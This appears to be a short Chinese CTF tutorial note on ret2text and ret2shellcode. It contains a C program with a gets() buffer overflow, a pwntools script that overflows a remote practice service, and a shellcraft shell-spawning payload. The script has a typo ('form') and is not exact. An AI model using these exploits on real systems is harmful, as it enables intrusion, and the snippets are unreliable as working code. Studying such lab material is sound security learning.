# ret2text

```c
#include<stdio.h>
int main(){
	char str[8];
  gets(str);	//由于gets函数缺陷，可以输入超出缓冲区的数据大小，进而覆盖掉返回地址
  return 0;
}
```

gets() 函数的缺陷：

​	它不提供对缓冲区大小的检查，因此容易导致缓冲区溢出，这是一种常见的安全漏洞。攻击者可以利用这种漏洞来执行恶意代码或破坏程序的行为。gets() 函数不会在读取到换行符之前停止读取，这可能导致它读取超出目标缓冲区大小的数据，造成缓冲区溢出。

read() 函数的缺陷：

​	read() 函数通常用于低级I/O操作，它不会对输入数据进行解释或处理，因此可能导致缓冲区溢出或其他安全问题。就像 gets() 一样，如果使用不当，read() 也可能导致缓冲区溢出。read() 函数需要手动指定要读取的字节数，如果不小心指定了一个超过目标缓冲区大小的字节数，也可能导致缓冲区溢出。

## 简单栈溢出编写

```python
from pwn form *
#p = process('./pwn')
p = remote('node.buuoj.cn',8888)
payload = b'A'*8 + p64(0x12345678)
p.sendline(payload)
p.interactive()
```

# ret2shellcode

在 pwntools 中，shellcraft 模块用于生成各种类型的 shellcode，例如反弹 shell、执行系统调用等。shellcraft.sh 脚本通常是 pwntools 的一部分，用于生成 shellcode 的脚本，它包含了一系列的 shellcode 模板，可以根据需要生成对应的 shellcode，并且可以方便地嵌入到漏洞利用脚本中。

## shellcraft模块生成

```python
shellcraft.sh()
p.sendline(asm(shellcraft.sh()))
```

一般来说，靶机基本都开启了ALSR，所以不会对栈写入shellcode，
